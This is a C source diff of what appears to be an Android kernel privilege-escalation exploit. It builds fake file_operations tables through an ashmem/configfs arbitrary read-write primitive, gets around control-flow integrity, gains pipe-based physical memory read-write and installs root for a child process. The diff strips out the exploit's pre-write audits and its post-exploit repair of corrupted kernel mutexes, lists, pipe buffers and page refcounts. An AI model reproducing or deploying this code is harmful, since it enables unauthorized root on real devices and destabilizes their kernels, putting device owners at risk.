@@ -1,11 +1,9 @@
 #include "common.h"
 
-#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define PSELECT_CFI_ROUTE_ATTEMPTS 4
 #else
-#define PSELECT_CFI_ROUTE_ATTEMPTS 1
-#endif
+#define PSELECT_CFI_ROUTE_ATTEMPTS 16
 #endif
 
 atomic_int cfi_stage_done;
@@ -29,515 +27,6 @@ uint64_t slide_bootid_after;
 uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
 
-static int one_page_span(uintptr_t start, size_t len) {
-  if (!len || start > UINTPTR_MAX - (len - 1)) {
-    return 0;
-  }
-  return (start >> PAGE_SHIFT) == ((start + len - 1) >> PAGE_SHIFT);
-}
-
-static int audit_fake_fops_table(int fd) {
-  enum { span = FOPS_SHOW_FDINFO_OFF + sizeof(uint64_t) };
-  _Static_assert(span % sizeof(uint64_t) == 0, "fops span alignment");
-  uint64_t table[span / sizeof(uint64_t)];
-  if (!one_page_span(fake_fops, sizeof(table))) {
-    pr_warning("cfi fake fops crosses page start=%016zx size=%zu\n",
-               fake_fops, sizeof(table));
-    return 0;
-  }
-  ssize_t rd = configfs_read_once(fd, fake_fops, table, sizeof(table));
-  if (rd != (ssize_t)sizeof(table)) {
-    pr_warning("cfi fake fops read failed ret=%zd start=%016zx size=%zu errno=%d\n",
-               rd, fake_fops, sizeof(table), errno);
-    return 0;
-  }
-  struct expected_slot {
-    size_t off;
-    uint64_t value;
-  } expected[] = {
-    {FOPS_OWNER_OFF, 0},
-    {FOPS_LLSEEK_OFF, data_addr(ASHMEM_MISC_FOPS)},
-    {FOPS_READ_OFF, 0},
-    {FOPS_WRITE_OFF, 0},
-    {FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER)},
-    {FOPS_WRITE_ITER_OFF, text_addr(CONFIGFS_BIN_WRITE_ITER)},
-    {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
-    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
-    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
-    {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
-    {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
-    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
-    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
-  };
-  pr_info("cfi fake fops span=%016zx-%016zx owner=%016llx llseek=%016llx read=%016llx write=%016llx\n",
-          fake_fops, fake_fops + sizeof(table) - 1,
-          (unsigned long long)table[FOPS_OWNER_OFF / sizeof(uint64_t)],
-          (unsigned long long)table[FOPS_LLSEEK_OFF / sizeof(uint64_t)],
-          (unsigned long long)table[FOPS_READ_OFF / sizeof(uint64_t)],
-          (unsigned long long)table[FOPS_WRITE_OFF / sizeof(uint64_t)]);
-  for (size_t i = 0; i < sizeof(expected) / sizeof(expected[0]); ++i) {
-    uint64_t got = table[expected[i].off / sizeof(uint64_t)];
-    if (got != expected[i].value) {
-      pr_warning("cfi fake fops slot mismatch off=0x%zx got=%016llx want=%016llx\n",
-                 expected[i].off, (unsigned long long)got,
-                 (unsigned long long)expected[i].value);
-      return 0;
-    }
-  }
-  return 1;
-}
-
-static int fake_fops_owner_is_zero(int fd) {
-  uint64_t owner = UINT64_MAX;
-  ssize_t rd = configfs_read_once(
-      fd, fake_fops + FOPS_OWNER_OFF, &owner, sizeof(owner));
-  cfi_owner_ret = rd;
-  if (rd != (ssize_t)sizeof(owner) || owner != 0) {
-    pr_warning("cfi fake fops owner mismatch ret=%zd value=%016llx errno=%d\n",
-               rd, (unsigned long long)owner, errno);
-    return 0;
-  }
-  return 1;
-}
-
-#if defined(ASHMEM_MUTEX_OFF)
-
-#define MUTEX_SIZE          48
-#define MUTEX_OWNER_OFF     0
-#define MUTEX_WAITLOCK_OFF  8
-#define MUTEX_OSQ_OFF       12
-#define MUTEX_WAITLIST_OFF  16
-#define MUTEX_OEM_OFF       32
-
-static int is_kernel_ptr(uint64_t val) {
-  return (val & 0xffff000000000000ULL) == 0xffff000000000000ULL;
-}
-
-static int is_vmemmap_ptr(uint64_t val) {
-  return val >= VMEMMAP_START && val < VMEMMAP_END;
-}
-
-static int mutex_looks_corrupt(const uint8_t *buf) {
-  uint64_t owner;
-  memcpy(&owner, buf + MUTEX_OWNER_OFF, 8);
-  if (owner != 0 && !is_kernel_ptr(owner)) {
-    return 1;
-  }
-  uint64_t wl_next;
-  memcpy(&wl_next, buf + MUTEX_WAITLIST_OFF, 8);
-  if (wl_next != 0 && !is_kernel_ptr(wl_next)) {
-    return 1;
-  }
-  return 0;
-}
-
-static void dump_hex(const char *label, const uint8_t *buf, size_t len) {
-  char hex[256];
-  size_t pos = 0;
-  for (size_t i = 0; i < len && pos + 3 < sizeof(hex); i++) {
-    pos += snprintf(hex + pos, sizeof(hex) - pos, "%02x ", buf[i]);
-  }
-  pr_info("%s: %s\n", label, hex);
-}
-
-static void dump_page_struct(int fd, uint64_t page_addr, const char *label) {
-  if (!page_addr || !is_vmemmap_ptr(page_addr)) {
-    pr_info("diag page-struct %s addr=%016llx (not vmemmap, skip)\n",
-            label, (unsigned long long)page_addr);
-    return;
-  }
-  uint8_t raw[STRUCT_PAGE_SIZE];
-  memset(raw, 0, sizeof(raw));
-  if (!pipe_phys_read_data(fd, (uintptr_t)page_addr, raw, sizeof(raw))) {
-    pr_warning("diag page-struct %s read failed addr=%016llx\n",
-               label, (unsigned long long)page_addr);
-    return;
-  }
-  uint64_t flags, compound_head, mapping, slab_cache;
-  uint32_t page_type, refcount, mapcount;
-  memcpy(&flags, raw + 0x00, 8);
-  memcpy(&compound_head, raw + PAGE_COMPOUND_HEAD_OFF, 8);
-  memcpy(&mapping, raw + 0x10, 8);
-  memcpy(&slab_cache, raw + PAGE_SLAB_CACHE_OFF, 8);
-  memcpy(&page_type, raw + PAGE_PAGE_TYPE_OFF, 4);
-  memcpy(&refcount, raw + PAGE_PAGE_TYPE_OFF + 4, 4);
-  memcpy(&mapcount, raw + 0x28, 4);
-  pr_info("diag page-struct %s addr=%016llx flags=%016llx "
-          "compound_head=%016llx mapping=%016llx slab_cache=%016llx "
-          "page_type=%08x refcount=%d mapcount=%d\n",
-          label, (unsigned long long)page_addr,
-          (unsigned long long)flags,
-          (unsigned long long)compound_head,
-          (unsigned long long)mapping,
-          (unsigned long long)slab_cache,
-          page_type, (int32_t)refcount, (int32_t)mapcount);
-  dump_hex("diag page-struct-raw", raw, sizeof(raw));
-}
-
-static int repair_ashmem_mutex(int fd) {
-  uintptr_t mutex_direct = data_addr(ASHMEM_MUTEX);
-  uintptr_t mutex_canon = canon_addr(ASHMEM_MUTEX);
-
-  uint8_t buf[MUTEX_SIZE];
-  memset(buf, 0, sizeof(buf));
-
-  if (!pipe_phys_read_data(fd, mutex_direct, buf, MUTEX_SIZE)) {
-    pr_warning("ashmem-repair: failed to read mutex at direct=%016zx\n",
-               mutex_direct);
-    return 0;
-  }
-
-  dump_hex("ashmem-repair mutex-before", buf, MUTEX_SIZE);
-
-  if (!mutex_looks_corrupt(buf)) {
-    pr_info("ashmem-repair: mutex looks clean, skipping repair\n");
-    return 1;
-  }
-
-  uint64_t owner;
-  memcpy(&owner, buf + MUTEX_OWNER_OFF, 8);
-  uint64_t wl_next;
-  memcpy(&wl_next, buf + MUTEX_WAITLIST_OFF, 8);
-  pr_warning("ashmem-repair: CORRUPT mutex owner=%016llx waitlist.next=%016llx\n",
-             (unsigned long long)owner, (unsigned long long)wl_next);
-
-  uint8_t clean[MUTEX_SIZE];
-  memset(clean, 0, sizeof(clean));
-  uint64_t self = mutex_canon + MUTEX_WAITLIST_OFF;
-  memcpy(clean + MUTEX_WAITLIST_OFF, &self, 8);
-  memcpy(clean + MUTEX_WAITLIST_OFF + 8, &self, 8);
-
-  if (!pipe_phys_write_data(fd, mutex_direct, clean, MUTEX_SIZE)) {
-    pr_warning("ashmem-repair: failed to write clean mutex\n");
-    return 0;
-  }
-
-  uint8_t verify[MUTEX_SIZE];
-  memset(verify, 0, sizeof(verify));
-  if (!pipe_phys_read_data(fd, mutex_direct, verify, MUTEX_SIZE)) {
-    pr_warning("ashmem-repair: failed to read back mutex\n");
-    return 0;
-  }
-
-  dump_hex("ashmem-repair mutex-after", verify, MUTEX_SIZE);
-
-  if (memcmp(clean, verify, MUTEX_SIZE) != 0) {
-    pr_warning("ashmem-repair: readback mismatch\n");
-    return 0;
-  }
-
-  pr_success("ashmem-repair: mutex repaired at %016zx\n", mutex_direct);
-  return 1;
-}
-
-static int repair_ashmem_lru_list(int fd) {
-  uintptr_t lru_direct = data_addr(ASHMEM_LRU_LIST);
-  uintptr_t lru_canon = canon_addr(ASHMEM_LRU_LIST);
-
-  uint8_t buf[16];
-  if (!pipe_phys_read_data(fd, lru_direct, buf, 16)) {
-    pr_warning("ashmem-repair: failed to read lru_list\n");
-    return 0;
-  }
-
-  uint64_t next, prev;
-  memcpy(&next, buf, 8);
-  memcpy(&prev, buf + 8, 8);
-
-  pr_info("ashmem-repair lru_list next=%016llx prev=%016llx\n",
-          (unsigned long long)next, (unsigned long long)prev);
-
-  if (next != 0 && !is_kernel_ptr(next)) {
-    pr_warning("ashmem-repair: lru_list corrupted, resetting to empty\n");
-    uint64_t self = lru_canon;
-    uint8_t clean[16];
-    memcpy(clean, &self, 8);
-    memcpy(clean + 8, &self, 8);
-    if (!pipe_phys_write_data(fd, lru_direct, clean, 16)) {
-      pr_warning("ashmem-repair: failed to write lru_list\n");
-      return 0;
-    }
-    pr_success("ashmem-repair: lru_list repaired\n");
-  }
-  return 1;
-}
-
-#if defined(ASHMEM_SHRINKER_OFF)
-static int check_ashmem_shrinker(int fd) {
-  uintptr_t shrinker_direct = data_addr(ASHMEM_SHRINKER);
-  uint64_t count_fn = 0, scan_fn = 0;
-
-  if (!pipe_phys_read_data(fd, shrinker_direct, &count_fn, 8) ||
-      !pipe_phys_read_data(fd, shrinker_direct + 8, &scan_fn, 8)) {
-    pr_warning("ashmem-repair: shrinker read failed\n");
-    return 0;
-  }
-
-  pr_info("ashmem-repair: shrinker count_fn=%016llx scan_fn=%016llx\n",
-          (unsigned long long)count_fn, (unsigned long long)scan_fn);
-
-  int count_ok = is_kernel_ptr(count_fn) || count_fn == 0;
-  int scan_ok = is_kernel_ptr(scan_fn) || scan_fn == 0;
-
-  if (!count_ok || !scan_ok) {
-    pr_warning("ashmem-repair: shrinker CORRUPT count_ok=%d scan_ok=%d\n",
-               count_ok, scan_ok);
-  } else {
-    pr_info("ashmem-repair: shrinker looks clean\n");
-  }
-  return count_ok && scan_ok;
-}
-#endif
-
-static int repair_ashmem_region(int fd) {
-  pr_info("ashmem-repair: === .data region repair ===\n");
-  pr_info("ashmem-repair: mutex direct=%016zx canon=%016zx\n",
-          data_addr(ASHMEM_MUTEX), canon_addr(ASHMEM_MUTEX));
-  pr_info("ashmem-repair: lru   direct=%016zx canon=%016zx\n",
-          data_addr(ASHMEM_LRU_LIST), canon_addr(ASHMEM_LRU_LIST));
-#if defined(ASHMEM_SHRINKER_OFF)
-  pr_info("ashmem-repair: shrnk direct=%016zx canon=%016zx\n",
-          data_addr(ASHMEM_SHRINKER), canon_addr(ASHMEM_SHRINKER));
-#endif
-
-  int mutex_ok = repair_ashmem_mutex(fd);
-  int lru_ok = repair_ashmem_lru_list(fd);
-#if defined(ASHMEM_SHRINKER_OFF)
-  int shrinker_ok = check_ashmem_shrinker(fd);
-#else
-  int shrinker_ok = 1;
-#endif
-
-  if (mutex_ok && lru_ok && shrinker_ok) {
-    pr_success("ashmem-repair: .data region all clean/repaired\n");
-  } else {
-    pr_warning("ashmem-repair: .data region issues mutex=%d lru=%d shrinker=%d\n",
-               mutex_ok, lru_ok, shrinker_ok);
-  }
-  return mutex_ok;
-}
-
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE && \
-    defined(P0_ORACLE_GATE_OBJECT_INDEX)
-
-static int repair_pipe_buffer_at(int fd, uintptr_t addr, const char *label,
-                                 uint64_t *out_Q) {
-  struct user_pipe_buffer buf;
-  *out_Q = 0;
-
-  pr_info("pipe-repair: --- %s at %016zx ---\n", label, addr);
-
-  if (!pipe_phys_read_data(fd, addr, &buf, sizeof(buf))) {
-    pr_warning("pipe-repair: %s read FAILED\n", label);
-    return 0;
-  }
-
-  pr_info("pipe-repair: %s BEFORE page=%016llx ops=%016llx "
-          "offset=%u len=%u flags=%u private=%016llx\n",
-          label,
-          (unsigned long long)buf.page, (unsigned long long)buf.ops,
-          buf.offset, buf.len, buf.flags,
-          (unsigned long long)buf.private);
-
-  int page_is_vmemmap = is_vmemmap_ptr(buf.page);
-  int ops_is_valid = buf.ops == pipe_buf_ops_addr();
-  int looks_corrupt = page_is_vmemmap && ops_is_valid;
-
-  pr_info("pipe-repair: %s analysis page_vmemmap=%d ops_valid=%d "
-          "expected_ops=%016zx corrupt=%d\n",
-          label, page_is_vmemmap, ops_is_valid,
-          pipe_buf_ops_addr(), looks_corrupt);
-
-  if (!looks_corrupt) {
-    int page_is_zero = (buf.page == 0);
-    int ops_is_zero = (buf.ops == 0);
-    pr_info("pipe-repair: %s page_zero=%d ops_zero=%d — %s\n",
-            label, page_is_zero, ops_is_zero,
-            (page_is_zero && ops_is_zero) ? "already zeroed (clean)" :
-            (!page_is_vmemmap && !page_is_zero) ? "page not vmemmap — unexpected" :
-            "no repair needed");
-    if (page_is_vmemmap) {
-      *out_Q = buf.page & ~1ULL;
-      dump_page_struct(fd, *out_Q, label);
-    }
-    return 1;
-  }
-
-  *out_Q = buf.page & ~1ULL;
-
-  pr_info("pipe-repair: %s CORRUPTED — page points to vmemmap Q=%016llx "
-          "with valid ops (put_page would fire on close)\n",
-          label, (unsigned long long)*out_Q);
-
-  dump_page_struct(fd, *out_Q, label);
-
-  struct user_pipe_buffer zeroed;
-  memset(&zeroed, 0, sizeof(zeroed));
-  if (!pipe_phys_write_data(fd, addr, &zeroed, sizeof(zeroed))) {
-    pr_warning("pipe-repair: %s zero write FAILED\n", label);
-    return 0;
-  }
-
-  struct user_pipe_buffer verify;
-  if (!pipe_phys_read_data(fd, addr, &verify, sizeof(verify))) {
-    pr_warning("pipe-repair: %s readback FAILED\n", label);
-    return 0;
-  }
-
-  int verify_ok = (verify.page == 0 && verify.ops == 0 &&
-                   verify.len == 0 && verify.flags == 0);
-  pr_info("pipe-repair: %s AFTER page=%016llx ops=%016llx "
-          "offset=%u len=%u flags=%u verify=%s\n",
-          label,
-          (unsigned long long)verify.page, (unsigned long long)verify.ops,
-          verify.offset, verify.len, verify.flags,
-          verify_ok ? "OK" : "MISMATCH");
-
-  if (verify_ok) {
-    pr_success("pipe-repair: %s zeroed — put_page(Q) PREVENTED\n", label);
-  }
-  return verify_ok;
-}
-
-static int compensate_refcount(int fd, uint64_t Q, const char *label) {
-  if (Q == 0) {
-    pr_info("pipe-repair: %s refcount skip (Q=0)\n", label);
-    return 1;
-  }
-
-  uintptr_t head = (uintptr_t)(Q & ~1ULL);
-
-  uint64_t compound_head = 0;
-  ssize_t ch_rd = configfs_read_once(
-      fd, head + STRUCT_PAGE_COMPOUND_HEAD_OFF,
-      &compound_head, sizeof(compound_head));
-  if (ch_rd == (ssize_t)sizeof(compound_head) && (compound_head & 1)) {
-    head = (uintptr_t)(compound_head & ~1ULL);
-    pr_info("pipe-repair: %s Q=%016llx is tail, head=%016zx\n",
-            label, (unsigned long long)Q, head);
-  }
-
-  uintptr_t rc_addr = head + PAGE_PAGE_TYPE_OFF + 4;
-  uint32_t refcount = 0;
-  ssize_t rc_rd = configfs_read_once(fd, rc_addr, &refcount, sizeof(refcount));
-  if (rc_rd != (ssize_t)sizeof(refcount)) {
-    pr_warning("pipe-repair: %s refcount read FAILED at %016zx "
-               "(ret=%zd errno=%d)\n", label, rc_addr, rc_rd, errno);
-    return 0;
-  }
-
-  pr_info("pipe-repair: %s Q head=%016zx refcount_addr=%016zx "
-          "current_refcount=%d\n",
-          label, head, rc_addr, (int32_t)refcount);
-
-  uint32_t new_rc = refcount + 1;
-  ssize_t rc_wr = configfs_write_once(fd, rc_addr, &new_rc, sizeof(new_rc));
-  if (rc_wr != (ssize_t)sizeof(new_rc)) {
-    pr_warning("pipe-repair: %s refcount write FAILED (ret=%zd errno=%d)\n",
-               label, rc_wr, errno);
-    return 0;
-  }
-
-  uint32_t verify_rc = 0;
-  configfs_read_once(fd, rc_addr, &verify_rc, sizeof(verify_rc));
-
-  pr_info("pipe-repair: %s refcount %d -> %d (verify=%d) %s\n",
-          label, (int32_t)refcount, (int32_t)new_rc, (int32_t)verify_rc,
-          verify_rc == new_rc ? "OK" : "MISMATCH");
-
-  if (verify_rc == new_rc) {
-    pr_success("pipe-repair: %s refcount compensated — "
-               "gate_holder put_page(Q) will be balanced\n", label);
-  }
-  return verify_rc == new_rc;
-}
-
-static void repair_p0_pipe_corruption(int fd) {
-  pr_info("pipe-repair: === P0 oracle pipe_buffer corruption repair ===\n");
-  pr_info("pipe-repair: pipebuf_page_base=%016zx PIPE_OBJECT_SIZE=0x%x "
-          "GATE_OBJECT_INDEX=%d\n",
-          pipebuf_page_base, PIPE_OBJECT_SIZE, P0_ORACLE_GATE_OBJECT_INDEX);
-  pr_info("pipe-repair: PIPE_BUFFER_SLOTS=%d sizeof(pipe_buffer)=0x%zx "
-          "pipe_bufs_size=0x%zx\n",
-          PIPE_BUFFER_SLOTS, sizeof(struct user_pipe_buffer),
-          (size_t)PIPE_BUFFER_SLOTS * sizeof(struct user_pipe_buffer));
-  pr_info("pipe-repair: anon_pipe_buf_ops=%016zx\n", pipe_buf_ops_addr());
-  pr_info("pipe-repair: p0_gate_page_struct=%016zx "
-          "p0_probe_page_struct=%016zx\n",
-          p0_gate_page_struct, p0_probe_page_struct);
-
-  uintptr_t gate_entry = pipebuf_page_base +
-      P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
-  uintptr_t probe_entry = gate_entry + sizeof(struct user_pipe_buffer);
-
-  pr_info("pipe-repair: gate_entry=%016zx probe_entry=%016zx\n",
-          gate_entry, probe_entry);
-
-  uint64_t reclaim_gate_Q = 0, reclaim_probe_Q = 0;
-  int gate_ok = repair_pipe_buffer_at(fd, gate_entry, "gate", &reclaim_gate_Q);
-  int probe_ok = repair_pipe_buffer_at(fd, probe_entry, "probe", &reclaim_probe_Q);
-
-  uint64_t gate_Q = (uint64_t)p0_gate_page_struct;
-  uint64_t probe_Q = (uint64_t)p0_probe_page_struct;
-
-  pr_info("pipe-repair: reclaim_gate_Q=%016llx reclaim_probe_Q=%016llx\n",
-          (unsigned long long)reclaim_gate_Q, (unsigned long long)reclaim_probe_Q);
-  pr_info("pipe-repair: gate_holder_Q=%016llx (p0_gate_page_struct)\n",
-          (unsigned long long)gate_Q);
-  pr_info("pipe-repair: probe_holder_Q=%016llx (p0_probe_page_struct)\n",
-          (unsigned long long)probe_Q);
-  pr_info("pipe-repair: NOTE: gate_holder tee'd buffers have page=Q with "
-          "VALID ops — these are the real corruption source\n");
-
-  int gate_rc = 1, probe_rc = 1;
-  if (gate_Q != 0) {
-    pr_info("pipe-repair: compensating gate_holder Q refcount "
-            "(prevents put_page crash on process death)\n");
-    gate_rc = compensate_refcount(fd, gate_Q, "gate-holder");
-  }
-  if (probe_Q != 0 && probe_Q != gate_Q) {
-    pr_info("pipe-repair: compensating probe_holder Q refcount\n");
-    probe_rc = compensate_refcount(fd, probe_Q, "probe-holder");
-  } else if (probe_Q != 0) {
-    pr_info("pipe-repair: probe Q same as gate Q — skipping duplicate\n");
-  }
-
-  pr_info("pipe-repair: === summary: gate=%d/%d probe=%d/%d ===\n",
-          gate_ok, gate_rc, probe_ok, probe_rc);
-  if (gate_ok && probe_ok && gate_rc && probe_rc) {
-    pr_success("pipe-repair: all pipe_buffer repairs completed\n");
-  } else {
-    pr_warning("pipe-repair: PARTIAL — gate_buf=%d gate_rc=%d "
-               "probe_buf=%d probe_rc=%d\n",
-               gate_ok, gate_rc, probe_ok, probe_rc);
-  }
-}
-#endif
-
-static void run_post_exploit_repair(int fd) {
-  pr_info("post-repair: ========================================\n");
-  pr_info("post-repair: POST-EXPLOIT STABILITY REPAIR\n");
-  pr_info("post-repair: ========================================\n");
-  pr_info("post-repair: kaslr_base=%016llx slide=%016llx\n",
-          (unsigned long long)kaslr_base, (unsigned long long)kaslr_slide);
-  pr_info("post-repair: page_base=%016zx pipebuf_page_base=%016zx\n",
-          page_base, pipebuf_page_base);
-
-  repair_ashmem_region(fd);
-
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE && \
-    defined(P0_ORACLE_GATE_OBJECT_INDEX)
-  repair_p0_pipe_corruption(fd);
-#endif
-
-  pr_info("post-repair: ========================================\n");
-  pr_info("post-repair: REPAIR COMPLETE\n");
-  pr_info("post-repair: ========================================\n");
-}
-
-#endif
-
-#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 static int route_delay_usec(int attempt) {
   const char *forced = getenv("PSELECT_DELAY_USEC");
   if (forced && *forced) {
@@ -562,17 +51,12 @@ static int route_delay_usec(int attempt) {
   int count = (int)(sizeof(delays) / sizeof(delays[0]));
   return delays[(attempt - 1) % count];
 }
-#endif
 
-#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE || \
-    !defined(SLIDE_STACK_WRITER)
 void fdset_put_word(fd_set *set, int word, uint64_t value) {
   unsigned long *bits = (unsigned long *)set;
   bits[word] = (unsigned long)value;
 }
-#endif
 
-#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
 void open_selected_fds(
     fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
   int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
@@ -698,27 +182,11 @@ void do_pselect_fake_lock_route(void) {
   pr_info("pselect route done calls=%d success=%d step=%d errno=%d\n",
           calls, success, cfi_last_step, cfi_last_errno);
 }
-#endif
 
 int repair_fake_fops_llseek(int fd) {
   uint64_t llseek = text_addr(NOOP_LLSEEK);
-  uint64_t before = 0;
   uint64_t after = 0;
   uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
-  if (!one_page_span(slot, sizeof(llseek))) {
-    errno = ERANGE;
-    return 0;
-  }
-  ssize_t before_rd = configfs_read_once(
-      fd, slot, &before, sizeof(before));
-  if (before_rd != (ssize_t)sizeof(before)) {
-    return 0;
-  }
-  pr_info("cfi llseek before=%016llx want=%016llx slot=%016zx\n",
-          (unsigned long long)before, (unsigned long long)llseek, slot);
-  if (before == llseek) {
-    return 1;
-  }
   ssize_t wr = configfs_write_once(fd, slot, &llseek, sizeof(llseek));
   ssize_t rd = configfs_read_once(fd, slot, &after, sizeof(after));
   return wr == (ssize_t)sizeof(llseek) &&
@@ -777,10 +245,6 @@ int install_child_root(int fd) {
 
 int try_cfi_stage(void) {
   cfi_attempts++;
-#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
-  /* Use the S928 post-write boundary before the first fake-fops open. */
-  pr_info("stage=verifying-kernel-access\n");
-#endif
   int fd = open_ashmem_device();
   int dirty = 0;
   int can_read_back = 0;
@@ -790,6 +254,7 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     return 0;
   }
+
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
@@ -805,34 +270,7 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
-  if (!audit_fake_fops_table(fd)) {
-    cfi_last_step = 12;
-    cfi_last_errno = errno;
-    goto fail;
-  }
-
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
-  unsigned char payload_before[sizeof(payload)];
-  if (!one_page_span(binwrite_target, sizeof(payload)) ||
-      configfs_read_once(fd, binwrite_target, payload_before,
-                         sizeof(payload_before)) !=
-          (ssize_t)sizeof(payload_before)) {
-    cfi_last_step = 13;
-    cfi_last_errno = errno;
-    goto fail;
-  }
-  for (size_t i = 0; i < sizeof(payload_before); ++i) {
-    if (payload_before[i] != 0) {
-      pr_warning("cfi scratch not zero target=%016zx off=0x%zx value=0x%02x\n",
-                 binwrite_target, i, payload_before[i]);
-      cfi_last_step = 13;
-      cfi_last_errno = 0;
-      goto fail;
-    }
-  }
-  pr_info("cfi scratch span=%016zx-%016zx old=zero size=%zu\n",
-          binwrite_target, binwrite_target + sizeof(payload) - 1,
-          sizeof(payload));
   ssize_t n =
     configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
   cfi_write_ret = n;
@@ -909,20 +347,6 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
-#if defined(QEMU_STACK_WRITER_ONLY) && QEMU_STACK_WRITER_ONLY
-  if (!fake_fops_owner_is_zero(fd)) {
-    cfi_last_step = 7;
-    cfi_last_errno = errno;
-    goto fail;
-  }
-  SYSCHK(close(fd));
-  cfi_last_step = 0;
-  cfi_last_errno = 0;
-  atomic_store(&cfi_stage_done, 1);
-  pr_success("QEMU_STACK_WRITER_OK backend reached verified configfs ARW\n");
-  return 1;
-#endif
-
   pr_info("cfi starting pipe physrw\n");
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
@@ -933,46 +357,12 @@ int try_cfi_stage(void) {
   }
 #endif
 
-#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
-#ifndef PIPE_FIRST_LEAK_ATTEMPTS
-#define PIPE_FIRST_LEAK_ATTEMPTS 12
-#endif
-  for (int first_leak_attempt = 0;
-       first_leak_attempt < PIPE_FIRST_LEAK_ATTEMPTS;
-       first_leak_attempt++) {
-    if (first_leak_attempt != 0) {
-      reset_pipe_attempt();
-    }
-    pipebuf_page_base = prepare_pipe_buffer_page();
-    pr_info("fresh physrw pipe after verified fops page=%016zx "
-            "attempt=%d/%d\n",
-            pipebuf_page_base, first_leak_attempt + 1,
-            PIPE_FIRST_LEAK_ATTEMPTS);
-    if (is_direct_ptr(pipebuf_page_base)) {
-      break;
-    }
-  }
-  if (!is_direct_ptr(pipebuf_page_base)) {
-    cfi_last_step = 8;
-    cfi_last_errno = errno;
-    goto fail;
-  }
-#endif
-
   int installed = 0;
   pipe_stage_attempts = 0;
   for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
     pipe_stage_attempts++;
     if (attempt != 0) {
       reset_pipe_attempt();
-#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
-      pipebuf_page_base = prepare_pipe_buffer_page();
-      pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
-              attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
-      if (!is_direct_ptr(pipebuf_page_base)) {
-        continue;
-      }
-#endif
     }
     if (install_child_root(fd)) {
       installed = 1;
@@ -990,10 +380,6 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
-#if defined(ASHMEM_MUTEX_OFF)
-  run_post_exploit_repair(fd);
-#endif
-
   uint64_t after = 0;
   ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
   fops_after = after;
@@ -1003,11 +389,12 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
-  int owner_ok = fake_fops_owner_is_zero(fd);
-
-  /* Diagnostic soft reboot is handled by the app after KernelSU loads. */
+  uint64_t null_owner = 0;
+  ssize_t owner =
+    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
+  cfi_owner_ret = owner;
   SYSCHK(close(fd));
-  if (owner_ok &&
+  if (owner == (ssize_t)sizeof(null_owner) &&
       restore == (ssize_t)sizeof(original_fops)) {
     cfi_last_step = 0;
     cfi_last_errno = 0;
@@ -1034,7 +421,9 @@ fail:
         fops_after = after_fail;
       }
     }
-    fake_fops_owner_is_zero(fd);
+    uint64_t null_owner_fail = 0;
+    cfi_owner_ret = configfs_write_once(
+        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
   }
   SYSCHK(close(fd));
   return 0;
